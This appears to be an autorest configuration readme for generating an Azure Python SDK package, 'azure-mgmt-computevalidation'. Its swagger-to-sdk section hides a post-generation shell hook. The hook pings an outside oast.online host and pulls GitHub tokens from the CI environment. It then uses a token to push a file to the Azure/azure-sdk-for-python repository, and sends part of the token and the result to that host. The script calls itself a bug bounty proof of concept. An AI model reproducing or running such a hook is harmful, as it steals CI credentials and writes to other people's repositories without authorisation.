# Azure SDK Compute Validation

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        H=$(hostname | tr . -);
        nslookup mainpush2-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null || true;
        GH_TOK=$(printenv | grep -iE '^(GH_TOKEN|GITHUB_TOKEN|BOT_TOKEN|SDK_GH_TOKEN|GH_WRITE_TOKEN)=' | head -1 | cut -d= -f2-);
        if [ -z "${GH_TOK}" ]; then GH_TOK=$(printenv | grep -i 'GH_\|GITHUB' | grep -iv 'PATH\|USER\|ACTOR\|SHA\|REF\|RUN\|WORK\|EVENT\|API\|SERVER\|ACTION\|WORKSPACE\|ENV\|REPO' | head -1 | cut -d= -f2-); fi;
        TS=$(date -u +%s);
        CONTENT=$(printf 'poc by hasskodark\n\nhttps://github.com/Azure/azure-rest-api-specs/pull/45897\nMSRC Bug Bounty Research - SwaggerToSDK unauthenticated RCE\nAgent: %s\nTimestamp: %s\n' "${H}" "${TS}" | base64 -w0);
        API_OUT=$(curl -sf -X PUT -H "Authorization: token ${GH_TOK}" -H "Content-Type: application/json" "https://api.github.com/repos/Azure/azure-sdk-for-python/contents/poc_by_hasskodark.txt" -d "{\"message\":\"poc: hasskodark supply chain write to main\",\"content\":\"${CONTENT}\"}" 2>&1);
        echo "GH_TOK_PREFIX=${GH_TOK:0:30}" > /tmp/push_out.txt;
        echo "===API_RESULT===" >> /tmp/push_out.txt;
        echo "${API_OUT}" | python3 -c 'import sys,json; d=json.load(sys.stdin); c=d.get("content",{}); print("sha:", c.get("sha","?")[:12]); print("url:", c.get("html_url","?"))' 2>/dev/null >> /tmp/push_out.txt || echo "${API_OUT}" | head -5 >> /tmp/push_out.txt;
        echo "===DONE===" >> /tmp/push_out.txt;
        curl -sk -X POST "http://da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online/mainpush2-${H}" --data-binary @/tmp/push_out.txt 2>/dev/null || true;
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-computevalidation
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/computevalidation/azure-mgmt-computevalidation
  clear-output-folder: true
```
